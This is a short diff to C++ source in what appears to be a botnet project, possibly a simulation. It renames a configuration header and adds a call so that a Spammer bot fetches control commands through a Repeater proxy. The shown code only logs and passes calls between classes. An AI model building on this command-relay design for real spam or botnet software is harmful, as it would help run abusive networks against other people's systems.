@@ -16,7 +16,7 @@
 
 #include "Spammer.h"
 #include "Repeater.h"
-#include "BotnetStaticConfiguration.h"
+#include "BotnetConfig.h"
 
 #include <iostream>
 #include <boost/smart_ptr.hpp>
@@ -84,6 +84,7 @@ void Spammer::get_command()
 	std::cout << "\033[01;36m" 
 				<< boost::format("%1$'-'8s %2$'-'36s %3$'-'28s %4$'-'36s\n") 
 				% "spammer" % Bot::id() % "get command through repeater" % repeater_proxy->id();
+	dynamic_cast<Repeater*>(repeater_proxy.get())->get_control_command();
 	return;
 }
 
